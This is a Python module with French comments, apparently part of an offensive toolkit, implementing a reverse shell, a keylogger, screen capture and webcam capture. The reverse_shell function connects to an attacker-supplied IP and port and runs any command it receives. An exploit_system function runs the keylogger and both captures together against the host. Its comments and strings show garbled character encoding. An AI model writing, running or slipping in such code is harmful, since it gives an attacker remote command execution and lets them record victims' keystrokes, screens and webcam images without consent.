import os
import socket
import platform
import threading
import subprocess
import time
from datetime import datetime
from pathlib import Path

# D√©pendances optionnelles avec compatibilit√© Render
try:
    if os.environ.get("DISPLAY"):
        import pyautogui
    else:
        raise ImportError("pyautogui d√©sactiv√© (DISPLAY manquant)")
except Exception as e:
    pyautogui = None
    print(f"‚ö†Ô∏è pyautogui indisponible sur ce syst√®me : {e}")

try:
    import cv2
except ImportError:
    cv2 = None

# üìÅ Chemins dynamiques
BASE_DIR = Path(__file__).resolve().parent.parent
KEYLOG_PATH = BASE_DIR / "outputs" / "keylogs" / "keylog.txt"
SCREENSHOT_PATH = BASE_DIR / "outputs" / "screenshots" / f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
WEBCAM_PATH = BASE_DIR / "outputs" / "screenshots" / f"webcam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"

# Cr√©ation des dossiers si n√©cessaires
for path in [KEYLOG_PATH.parent, SCREENSHOT_PATH.parent]:
    os.makedirs(path, exist_ok=True)

# -------------------------------------
# üêö Reverse Shell
# -------------------------------------
def reverse_shell(attacker_ip: str, attacker_port: int):
    """√âtablit un reverse shell avec une IP/port donn√©"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((attacker_ip, attacker_port))
        sock.send("[+] Reverse Shell √©tablie\n".encode("utf-8"))
        while True:
            command = sock.recv(1024).decode()
            if command.lower() in ['exit', 'quit']:
                break
            output = subprocess.getoutput(command)
            sock.send((output + "\n").encode("utf-8"))
        sock.close()
        return "‚úÖ Reverse shell termin√©"
    except Exception as e:
        return f"‚ùå Reverse shell √©chou√© : {e}"

# -------------------------------------
# ‚å®Ô∏è Keylogger
# -------------------------------------
def start_keylogger(duration_sec=60):
    """Capture les frappes clavier pendant une dur√©e donn√©e (60s par d√©faut)"""
    try:
        from pynput.keyboard import Listener

        def on_press(key):
            try:
                with open(KEYLOG_PATH, "a", encoding="utf-8") as log_file:
                    timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S] ")
                    if hasattr(key, 'char') and key.char:
                        log_file.write(f"{timestamp}{key.char}\n")
                    else:
                        log_file.write(f"{timestamp}[{key}]\n")
            except Exception:
                pass

        listener = Listener(on_press=on_press)
        listener.start()
        time.sleep(duration_sec)
        listener.stop()
        return f"‚úÖ Keylogger ex√©cut√© ({duration_sec}s)."
    except Exception as e:
        return f"‚ùå Erreur Keylogger : {e}"

# -------------------------------------
# üì∏ Capture √©cran
# -------------------------------------
def take_screenshot():
    """Capture une capture d‚Äô√©cran (si pyautogui dispo)"""
    if pyautogui:
        try:
            pyautogui.screenshot(SCREENSHOT_PATH)
            return f"‚úÖ Capture √©cran enregistr√©e : {SCREENSHOT_PATH}"
        except Exception as e:
            return f"‚ùå Erreur capture √©cran : {e}"
    return "‚ö†Ô∏è Capture √©cran d√©sactiv√©e (pyautogui non disponible)"

# -------------------------------------
# üé• Capture webcam (appel√©e via main.py -> capture_webcam)
# -------------------------------------
def capture_webcam():
    """Capture une image de la webcam (nom officiel utilis√© par main.py)"""
    if cv2:
        try:
            cam = cv2.VideoCapture(0)
            ret, frame = cam.read()
            if ret:
                cv2.imwrite(str(WEBCAM_PATH), frame)
                cam.release()
                return f"‚úÖ Capture webcam enregistr√©e : {WEBCAM_PATH}"
            else:
                cam.release()
                return "‚ùå Webcam inaccessible."
        except Exception as e:
            return f"‚ùå Erreur webcam : {e}"
    return "‚ö†Ô∏è Capture webcam d√©sactiv√©e (cv2 non disponible)"

# -------------------------------------
# üéØ Tout lancer
# -------------------------------------
def exploit_system(target_ip=None):
    """Lance screenshot, webcam et keylogger (version pour --exploit_sys)"""
    results = [
        take_screenshot(),
        capture_webcam(),
        start_keylogger(duration_sec=60)
    ]
    return "\n".join(results)

# üîÅ Test local
if __name__ == "__main__":
    print("[*] Lancement du module exploit_sys en mode test.")
    print(exploit_system())
